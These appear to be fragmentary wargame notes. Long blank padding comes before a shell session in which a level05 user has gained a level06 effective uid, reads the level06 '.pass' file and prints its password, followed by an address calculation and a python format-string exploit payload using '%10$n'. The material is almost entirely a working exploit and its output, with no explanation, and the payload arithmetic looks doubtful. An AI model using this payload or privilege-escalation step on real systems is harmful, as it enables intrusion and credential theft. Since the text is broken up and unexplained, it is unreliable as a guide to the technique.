                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  64                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       f7fcfac0
id
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
^C


0xffffdf60 -> 4294958944 -> 4294958944 - 4 = 4294958940

python -c 'print "\xe0\x97\x04\x08" + "%4294958940x" + "%10$n"'
